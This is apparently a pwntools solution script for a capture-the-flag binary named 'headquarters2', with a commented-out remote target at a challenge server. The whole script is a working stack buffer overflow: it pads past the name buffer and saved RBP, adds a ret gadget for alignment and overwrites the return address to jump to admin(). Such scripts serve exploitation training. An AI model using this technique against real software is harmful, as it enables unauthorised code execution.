from pwn import *

elf = context.binary = ELF('../src/headquarters2')

# io = remote('chal1.sieberr.live', 10004)
io = elf.process(stdin=PTY)

payload = b'A'*32 # fill up the `name` buffer
payload += b'B'*8 # fill up the RBP
payload += p64(0x40101a) # ret for stack alignment issues
payload += p64(elf.sym.admin) # overwrite RIP to point to admin()

io.sendline(payload)
io.interactive()
